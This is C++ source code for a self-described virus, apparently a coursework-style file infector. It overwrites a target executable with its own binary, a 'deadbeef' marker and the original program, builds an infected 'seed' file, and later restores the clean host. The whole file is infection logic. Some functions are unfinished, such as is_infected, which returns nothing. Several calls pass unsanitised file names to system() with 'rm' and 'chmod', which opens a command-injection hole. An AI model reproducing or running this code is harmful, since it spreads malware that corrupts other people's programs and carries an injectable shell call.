
#include <bits/stdc++.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <filesystem>

using namespace std;

bool is_file_exist(std::string fileName);
void create_directory(std::string directory);
void copy_binary(std::string host, std::string folder);
void copy_uninfected_binary(std::string host, std::string folder);
void modify_execute_access(std::string fileName, bool enable);
int get_file_size(std::string fileName);
void build_seed(std::string programName);
void copy_virus_binary(std::string host, std::string folder);
void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
int get_virus_size();

int main(int argc, char** argv) {
    std::string fileName;
    std::string argv0(argv[0]);
    std::string hostName = argv0.substr(2);
    std::string temporaryLocation = "garbage";
    std::string folder = "./tem/";
    create_directory(folder);
    if(argc > 1){
      fileName = argv[1];
      copy_uninfected_binary(hostName, folder);
      make_temp_copy(hostName, fileName, folder, temporaryLocation);
      infect_file(hostName, fileName, folder, temporaryLocation);
    }
    else{
      if(hostName == "virus"){
        build_seed(hostName);
        return 1;
      }
      fileName = "";
    }
    return 0;
}

bool is_infected(std::string infectedHost, std::string binary){

  int virusSize = get_virus_size();

}

void build_seed(std::string progName){
  std::ifstream virus(progName, std::ios::binary);
  std::ifstream host("host", std::ios::binary);
  std::ofstream seed("seed", std::ios::binary);
  seed << virus.rdbuf();
  std::string hex = "deadbeef";
  for (size_t i = 0; i < hex.length(); i += 2)
  {
    uint16_t byte;
    std::string nextbyte = hex.substr(i, 2);
    std::istringstream(nextbyte) >> std::hex >> byte;
    seed << static_cast<uint8_t>(byte);
  }
  seed << host.rdbuf();
  seed.close();
  host.close();
  virus.close();
  modify_execute_access("seed", true);
}

int get_file_size(std::string fileName){
  return std::filesystem::file_size(fileName);
}

int get_virus_size(){
  return get_file_size("virus");
}

void copy_virus_binary(std::string host, std::string folder){
    std::string hostSrc = host;
    std::string hostDest = "virus";
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    char buffer[virusSize];
    size_t actual = src.readsome(buffer, virusSize);
    dst.write(buffer, actual);
    src.close();
    dst.close();
}

void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
    std::string hostSrc = fileName;
    std::string hostDest = temporaryLocation;
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    dst << src.rdbuf();
}

void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
    std::string hostSrc = infectedHost;
    std::string hostDest = fileName;
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    cout<< virusSize << endl;
    char buffer[virusSize];
    size_t actual = src.readsome(buffer, virusSize);
    dst.write(buffer, actual);
    src.close();
    std::string hex = "deadbeef";
    for (size_t i = 0; i < hex.length(); i += 2)
    {
      uint16_t byte;
      std::string nextbyte = hex.substr(i, 2);
      std::istringstream(nextbyte) >> std::hex >> byte;
      dst << static_cast<uint8_t>(byte);
    }
    hostSrc = temporaryLocation;
    hostSrc.insert(0, folder);
    cout << hostSrc;
    std::ifstream src1(hostSrc, std::ios::binary);
    dst << src1.rdbuf();
    dst.close();
    src1.close();
    if(is_file_exist("temporaryLocation")){
      temporaryLocation.insert(0, "rm ");
      cout << temporaryLocation << endl;
      system(temporaryLocation.c_str());
    }
}

void copy_uninfected_binary(std::string host, std::string folder){
    std::string hostSrc = host;
    std::string hostDest = host;
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    src.seekg(virusSize + 4);
    dst << src.rdbuf();
}

void modify_execute_access(std::string fileName, bool enable){
    std::string cmdBuilder = fileName;
    if(enable){
      cmdBuilder.insert(0, "chmod ugo+x ");  
    }
    else{
      cmdBuilder.insert(0, "chmod ugo-x ");  
    }
    const char*command  = cmdBuilder.c_str();
    system(command);
}

void create_directory(std::string directory){
  const char* dir = directory.c_str();
  int check = mkdir(dir, 0777);
    if(check == -1){
      std::string cmdBuilder = directory;
      cmdBuilder.insert(0, "chmod 0777 ");
      const char*command  = cmdBuilder.c_str();
      system(command);
    }
}

bool is_file_exist(std::string fileName)
{
    std::ifstream ifile;
    ifile.open(fileName);
    if(ifile) {
      return true;
    } else {
      return false;
    }
}
